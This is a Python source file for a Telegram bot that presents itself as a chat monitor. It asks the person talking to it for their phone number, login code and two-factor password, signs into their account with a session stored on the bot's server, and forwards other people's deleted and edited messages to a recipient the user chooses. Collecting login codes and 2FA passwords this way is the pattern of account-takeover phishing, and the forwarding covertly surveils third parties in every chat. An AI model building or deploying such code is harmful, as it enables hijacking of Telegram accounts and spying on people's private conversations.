import os
import asyncio
import logging
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

# ========== КЛИЕНТЫ ==========
bot = TelegramClient('bot_session', API_ID, API_HASH)
user_client = None

# ========== СОСТОЯНИЯ ==========
waiting_for_target = False
target_id = None
waiting_for_phone = False
waiting_for_code = None
waiting_for_password = False
temp_password_phone = None
message_cache = {}
animation_task = None

# ========== ФУНКЦИЯ АНИМАЦИИ ==========
async def show_loading_animation(event, text="⏳ Обработка"):
    """Показывает анимацию со звёздочкой"""
    frames = ["⭐", "🌟", "✨", "💫", "⭐", "🌟", "✨", "💫"]
    msg = await event.reply(f"{frames[0]} {text}...")
    
    for i in range(20):  # 20 секунд анимации
        for frame in frames:
            await msg.edit(f"{frame} {text}...")
            await asyncio.sleep(0.3)
    return msg

# ========== ОБРАБОТЧИКИ ==========

@bot.on(events.NewMessage)
async def handler(event):
    global waiting_for_target, target_id, waiting_for_phone, waiting_for_code, user_client
    global waiting_for_password, temp_password_phone, animation_task
    
    user_id = event.sender_id
    text = event.message.text

    # === 1. ЕСЛИ ЖДЁМ ID ПОЛУЧАТЕЛЯ ===
    if waiting_for_target:
        try:
            # Показываем анимацию поиска
            anim = await show_loading_animation(event, "🔍 Поиск пользователя")
            
            target = await bot.get_entity(text.strip())
            target_id = target.id
            waiting_for_target = False
            
            target_name = getattr(target, 'first_name', 'пользователь')
            if hasattr(target, 'username') and target.username:
                target_name += f" (@{target.username})"
            
            await anim.edit(
                f"✅ **ID получателя сохранён!**\n\n"
                f"📬 Все уведомления будут отправляться:\n"
                f"👤 {target_name} (ID: {target_id})\n\n"
                f"📞 **Теперь отправь мне свой номер телефона** в формате:\n"
                f"`+79001234567`"
            )
            waiting_for_phone = True
            
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}\nПопробуй ещё раз (ID или @username):")
        return

    # === 2. ЕСЛИ ЖДЁМ НОМЕР ТЕЛЕФОНА ===
    if waiting_for_phone:
        phone = text.strip()
        waiting_for_phone = False
        waiting_for_code = phone
        
        # Показываем анимацию отправки кода
        anim = await show_loading_animation(event, "📨 Отправка кода")
        
        try:
            # Реально создаём клиента и запрашиваем код
            user_client = TelegramClient(f'user_{user_id}', API_ID, API_HASH)
            await user_client.connect()
            
            if not await user_client.is_user_authorized():
                await user_client.send_code_request(phone)
                
            await anim.edit(
                f"✅ **Код отправлен!**\n\n"
                f"📨 Код подтверждения отправлен в Telegram.\n"
                f"✍️ Введи его сюда (только цифры):"
            )
        except Exception as e:
            await anim.edit(f"❌ Ошибка: {e}\nПопробуй ещё раз /start")
            waiting_for_code = None
        return

    # === 3. ЕСЛИ ЖДЁМ 2FA ПАРОЛЬ ===
    if waiting_for_password:
        password = text.strip()
        phone = temp_password_phone
        
        try:
            anim = await show_loading_animation(event, "🔐 Проверка пароля")
            
            await user_client.sign_in(password=password)
            
            me = await user_client.get_me()
            await anim.edit(
                f"✅ **Успешный вход с 2FA!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"📱 Номер: {phone}\n\n"
                f"🔍 Теперь бот будет отслеживать все чаты."
            )
            
            waiting_for_password = False
            temp_password_phone = None
            asyncio.create_task(monitor_user_chats())
            
        except Exception as e:
            await anim.edit(f"❌ Ошибка: {e}\nПопробуй ещё раз:")
        return

    # === 4. ЕСЛИ ЖДЁМ КОД ===
    if waiting_for_code is not None:
        phone = waiting_for_code
        code = text.strip()
        
        try:
            anim = await show_loading_animation(event, "🔑 Проверка кода")
            
            if not user_client:
                user_client = TelegramClient(f'user_{user_id}', API_ID, API_HASH)
                await user_client.connect()
            
            if not await user_client.is_user_authorized():
                await user_client.sign_in(phone, code)
            
            me = await user_client.get_me()
            await anim.edit(
                f"✅ **Успешный вход!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"📱 Номер: {phone}\n\n"
                f"🔍 Теперь бот будет отслеживать все чаты."
            )
            
            waiting_for_code = None
            asyncio.create_task(monitor_user_chats())
            
        except SessionPasswordNeededError:
            waiting_for_password = True
            temp_password_phone = phone
            waiting_for_code = None
            await anim.edit(
                "🔐 **Требуется двухфакторный пароль.**\n\n"
                "Введи свой пароль от Telegram:"
            )
        except Exception as e:
            await anim.edit(f"❌ Ошибка входа: {e}")
            waiting_for_code = None
        return

    # === 5. ОСНОВНЫЕ КОМАНДЫ ===
    if text == "/start":
        waiting_for_target = True
        await event.reply(
            "👋 **Бот для мониторинга чатов**\n\n"
            "📝 **Введите ID или username пользователя**,\n"
            "которому будут приходить уведомления.\n\n"
            "Примеры:\n"
            "• ID: `7396285844`\n"
            "• Username: `@durov`"
        )
    
    elif text == "/stats":
        target_info = f"ID: {target_id}" if target_id else "не задан"
        await event.reply(
            f"📊 **Статистика**\n\n"
            f"📦 Кэш сообщений: {len(message_cache)}\n"
            f"📬 Получатель: {target_info}"
        )
    
    elif text == "/reset":
        waiting_for_target = True
        target_id = None
        waiting_for_phone = False
        waiting_for_code = None
        waiting_for_password = False
        if user_client:
            await user_client.disconnect()
            user_client = None
        await event.reply("🔄 **Настройки сброшены.**\nВведи ID получателя:")

# ========== МОНИТОРИНГ ЧАТОВ ==========

async def monitor_user_chats():
    global user_client
    
    if not user_client or not target_id:
        logger.error("Нет клиента или получателя")
        return
    
    logger.info(f"🔍 Начинаю мониторинг, уведомления в {target_id}")
    
    @user_client.on(events.NewMessage)
    async def user_message_handler(event):
        cache_key = f"{event.chat_id}_{event.message.id}"
        message_cache[cache_key] = {
            'text': event.message.text or "[медиа]",
            'time': datetime.now().isoformat(),
            'chat_id': event.chat_id,
            'sender_id': event.sender_id
        }
        
        if len(message_cache) > 2000:
            keys = list(message_cache.keys())[:500]
            for k in keys:
                del message_cache[k]

    @user_client.on(events.MessageDeleted)
    async def user_delete_handler(event):
        for msg_id in event.deleted_ids:
            cache_key = f"{event.chat_id}_{msg_id}"
            if cache_key in message_cache:
                msg = message_cache[cache_key]
                try:
                    chat = await user_client.get_entity(event.chat_id)
                    chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Чат'))
                except:
                    chat_name = "Неизвестный чат"
                
                await bot.send_message(
                    target_id,
                    f"🗑 **УДАЛЕНО** в чате {chat_name}\n\n"
                    f"👤 От: {msg['sender_id']}\n"
                    f"💬 {msg['text'][:300]}"
                )

    @user_client.on(events.MessageEdited)
    async def user_edit_handler(event):
        cache_key = f"{event.chat_id}_{event.message.id}"
        if cache_key in message_cache:
            old = message_cache[cache_key]['text']
            new = event.message.text
            if old != new:
                try:
                    chat = await user_client.get_entity(event.chat_id)
                    chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Чат'))
                except:
                    chat_name = "Неизвестный чат"
                
                await bot.send_message(
                    target_id,
                    f"✏️ **ИЗМЕНЕНО** в чате {chat_name}\n\n"
                    f"📝 Было: {old[:200]}\n"
                    f"📝 Стало: {new[:200]}"
                )
                message_cache[cache_key]['text'] = new

    await user_client.run_until_disconnected()

# ========== ЗАПУСК ==========

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен!")
    logger.info("👑 Ожидание ввода ID получателя...")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())